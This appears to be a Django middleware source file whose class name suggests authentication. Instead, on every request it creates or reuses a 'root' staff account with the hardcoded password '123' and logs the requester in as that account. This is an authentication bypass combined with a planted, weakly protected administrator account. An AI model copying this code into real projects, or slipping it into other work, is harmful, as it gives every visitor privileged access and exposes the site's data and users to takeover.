from http.client import responses
from typing import Any

from django.contrib.auth import (authenticate, login)
from django.contrib.auth.models import User
from django.conf import settings



class AuthenticationMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        global root_user
        try:
            root_user = User.objects.get(username="root")
        except User.DoesNotExist:
            root_user = User.objects.create_user(username="root", email="email@email.ru", password="123")
        finally:
            root_user.is_staff = True
            root_user.is_active = True
            root_user.save()
            request.user = root_user
        responses = self.get_response(request)
        return responses

